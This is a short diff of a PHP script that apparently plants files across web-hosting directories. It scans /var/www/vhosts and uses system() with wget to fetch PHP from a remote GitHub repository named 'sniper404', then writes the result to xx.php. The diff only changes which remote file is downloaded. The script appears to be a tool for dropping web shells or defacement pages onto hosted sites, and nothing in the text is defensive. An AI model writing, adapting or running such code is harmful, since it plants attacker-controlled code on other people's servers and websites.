@@ -5,7 +5,7 @@ $root = '/var/www/vhosts';
 $scan = scandir($root);
 
 $nama = 'xx.php'; 
-$isi = system("wget https://raw.githubusercontent.com/Sniperxxx/sniper404/main/root.php -O about.php");
+$isi = system("wget https://raw.githubusercontent.com/Sniperxxx/sniper404/main/Billy.php");
 
 $bikin = fopen($nama, "w");
 		 fwrite($bikin, $isi);
